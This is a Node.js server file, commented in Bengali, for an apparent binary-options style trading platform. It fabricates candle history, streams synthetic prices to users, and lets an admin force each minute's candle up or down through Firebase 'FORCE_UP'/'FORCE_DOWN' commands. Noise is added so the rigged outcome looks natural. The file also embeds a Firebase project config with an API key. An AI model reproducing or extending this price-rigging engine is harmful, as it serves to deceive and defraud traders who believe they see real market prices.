const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

// --- ফায়ারবেস কনফিগারেশন ---
const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- কনফিগারেশন ভেরিয়েবল ---
const MAX_CANDLES = 500; // Render এর র‍্যাম বাঁচাতে ৫০০ রাখাই যথেষ্ট
const TIMEFRAME = 60000; // ১ মিনিট
const TICK_MS = 250; // প্রতি ২৫০ মিলিসেকেন্ডে প্রাইস আপডেট হবে
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 300; // সার্ভার চালু হলে ৩০০ ক্যান্ডেল জেনারেট করে নিবে

const markets = {}; 
let activeAdminCommands = {}; // অ্যাডমিন কমান্ড স্টোর করার গ্লোবাল অবজেক্ট

function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

// --- অ্যাডমিন কমান্ড লিসেনার (Firebase থেকে) ---
db.ref('admin/market_control').on('value', (snapshot) => {
    activeAdminCommands = snapshot.val() || {};
});

// --- মার্কেট ইনিশিয়ালাইজেশন (History Setup in RAM) ---
async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.15; // ডিফল্ট প্রাইস
    
    try {
        const liveSnap = await db.ref(`markets/${path}/live`).once('value');
        if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
    } catch (e) {}

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let currentPrice = startPrice;

    // সার্ভার চালু হলে পেছনের ৩০০ মিনিটের ক্যান্ডেল র‍্যামে বানিয়ে নিবে
    for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
        const isGreen = Math.random() > 0.5;
        const body = (0.00005 + Math.random() * 0.0002) * currentPrice;
        const close = isGreen ? currentPrice + body : currentPrice - body;
        const high = Math.max(currentPrice, close) + (body * Math.random());
        const low = Math.min(currentPrice, close) - (body * Math.random());
        
        candles.push({ timestamp: nowPeriod - (i * TIMEFRAME), open: roundPrice(currentPrice), high: roundPrice(high), low: roundPrice(low), close: roundPrice(close) });
        currentPrice = close;
    }

    markets[marketId] = {
        marketId,
        marketPath: path,
        history: candles,
        targetCandle: null // টার্গেট ক্যান্ডেল রাখার জায়গা
    };
}

// --- 🔥 কোর লজিক: Target-First Approach 🔥 ---
function ensureTargetCandle(marketData, currentPeriod) {
    let lastCandle = marketData.history[marketData.history.length - 1];
    
    // যদি নতুন মিনিট শুরু হয়, তবেই নতুন টার্গেট সেট হবে
    if (!marketData.targetCandle || marketData.targetCandle.timestamp !== currentPeriod) {
        
        let openPrice = lastCandle ? lastCandle.close : 1.15;
        let targetColor;
        
        // ১. অ্যাডমিন কমান্ড চেক করা
        const command = activeAdminCommands[marketData.marketId];
        if (command && command.action && command.expireAt > Date.now()) {
            if (command.action === 'FORCE_UP') targetColor = 'GREEN';
            else if (command.action === 'FORCE_DOWN') targetColor = 'RED';
            console.log(`[ADMIN] ${marketData.marketId} Forced: ${targetColor}`);
        } else {
            // অ্যাডমিন কমান্ড না থাকলে রেন্ডম চলবে
            targetColor = Math.random() > 0.5 ? 'GREEN' : 'RED';
        }

        // ২. প্রাইস ক্যালকুলেশন
        const baseVolatility = openPrice * 0.00015;
        let bodySize = baseVolatility * (0.5 + Math.random());
        let closePrice = targetColor === 'GREEN' ? openPrice + bodySize : openPrice - bodySize;

        // টার্গেট সেভ করা
        marketData.targetCandle = {
            timestamp: currentPeriod,
            open: openPrice,
            close: closePrice,
            color: targetColor
        };
        
        // র‍্যামে নতুন ক্যান্ডেল পুশ করা (শুরুতে open, high, low, close সব এক থাকবে)
        const newCandle = { timestamp: currentPeriod, open: roundPrice(openPrice), high: roundPrice(openPrice), low: roundPrice(openPrice), close: roundPrice(openPrice) };
        marketData.history.push(newCandle);
        
        // মেমোরি ক্লিয়ার করা (৫০০ এর বেশি ক্যান্ডেল হলে প্রথমটা ডিলিট)
        if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
    }
}

// --- প্রাইস মুভমেন্ট লজিক (Smooth tick generator) ---
function updatePriceSmoothly(marketData, currentPeriod) {
    const target = marketData.targetCandle;
    if (!target) return;

    const liveCandle = marketData.history[marketData.history.length - 1];
    
    // ১ মিনিটের মধ্যে কতটুকু সময় পার হয়েছে (০ থেকে ১ এর মধ্যে)
    const timeElapsed = Date.now() - currentPeriod;
    const progress = Math.min(timeElapsed / 60000, 1.0); 

    // বেস প্রাইস পাথ (সরাসরি ওপেন থেকে ক্লোজের দিকে যাওয়া)
    const expectedBasePath = target.open + ((target.close - target.open) * progress);
    
    // চার্টে রিয়েলিস্টিক কাঁপুনি (Noise) তৈরি করা
    // ক্যান্ডেলের মাঝামাঝি সময়ে কাঁপুনি বেশি থাকবে, শেষের দিকে কমে যাবে
    const noiseMaxAllowed = Math.abs(target.close - target.open) * 0.8 * (1 - progress); 
    let noise = (Math.random() - 0.5) * noiseMaxAllowed;

    let newPrice = expectedBasePath + noise;

    // একদম শেষের ২ সেকেন্ডে প্রাইস সরাসরি টার্গেটে ফিক্স হয়ে যাবে (১০০% একিউরেসি)
    if (progress >= 0.98) { 
        newPrice = target.close; 
    }

    // ক্যান্ডেল আপডেট করা
    liveCandle.close = roundPrice(newPrice);
    liveCandle.high = roundPrice(Math.max(liveCandle.high, liveCandle.close, newPrice));
    liveCandle.low = roundPrice(Math.min(liveCandle.low, liveCandle.close, newPrice));
}

// --- ক্লায়েন্টদের কাছে ডাটা পাঠানো ---
function broadcastCandle(marketId, candle) {
    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(payload);
        }
    });
}

// --- ফায়ারবেস মার্কেট লিসেনার ---
db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach((marketId) => {
        const type = fbMarkets[marketId]?.type;
        if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
            initializeNewMarket(marketId);
        }
    });
});

// --- ওয়েবসকেট কানেকশন ---
wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
                // ইউজার কানেক্ট হলেই র‍্যাম থেকে শেষের ৩০০ ক্যান্ডেল হিস্ট্রি পাঠিয়ে দিবে
                if (markets[msg.market]) {
                    const historyPayload = { type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300) };
                    ws.send(JSON.stringify(historyPayload));
                }
            }
        } catch (_) {}
    });
});

// --- Cloudflare CDN Caching API (API for Frontend) ---
// ইউজার অ্যাপ ওপেন করলে এই লিংক থেকে হিস্ট্রি নিবে। Cloudflare এটি ক্যাশ করে রাখবে।
app.get('/api/history/:marketId', (req, res) => {
    const marketId = req.params.marketId;
    if (markets[marketId] && markets[marketId].history) {
        // 🔥 Cloudflare কে নির্দেশ দেওয়া হচ্ছে ৬০ সেকেন্ড ক্যাশ করে রাখতে 🔥
        res.setHeader('Cache-Control', 'public, max-age=15, s-maxage=60');
        res.json(markets[marketId].history.slice(-300));
    } else {
        res.status(404).json({ error: 'Market not found or not initialized' });
    }
});

// --- মেইন গ্লোবাল লুপ (প্রতি ২৫০ মিলিসেকেন্ডে চলবে) ---
let lastSyncMinute = 0;
setInterval(() => {
    const now = Date.now();
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
    const currentMinute = Math.floor(now / 60000);

    for (const marketId in markets) {
        const marketData = markets[marketId];
        
        ensureTargetCandle(marketData, currentPeriod); // টার্গেট ফিক্স করবে
        updatePriceSmoothly(marketData, currentPeriod); // প্রাইস মুভ করাবে
        
        broadcastCandle(marketId, marketData.history[marketData.history.length - 1]); // লাইভ ডাটা পাঠাবে
    }

    // প্রতি মিনিটে একবার ফায়ারবেসে বর্তমান প্রাইস ব্যাকআপ রাখা (ব্যান্ডউইথ বাঁচানোর জন্য)
    if (currentMinute > lastSyncMinute) {
        lastSyncMinute = currentMinute;
        const batchUpdates = {};
        for (const marketId in markets) {
            const m = markets[marketId];
            const lastC = m.history[m.history.length-1];
            if (lastC) {
                batchUpdates[`markets/${m.marketPath}/live`] = {
                    price: lastC.close,
                    timestamp: lastC.timestamp
                };
            }
        }
        db.ref().update(batchUpdates).catch(()=>{});
        console.log(`[Sync] ${Object.keys(markets).length} markets live price backed up to Firebase.`);
    }
}, TICK_MS);

app.get('/ping', (_req, res) => res.send('UltraSmooth V30 - Target-First Architecture Active'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));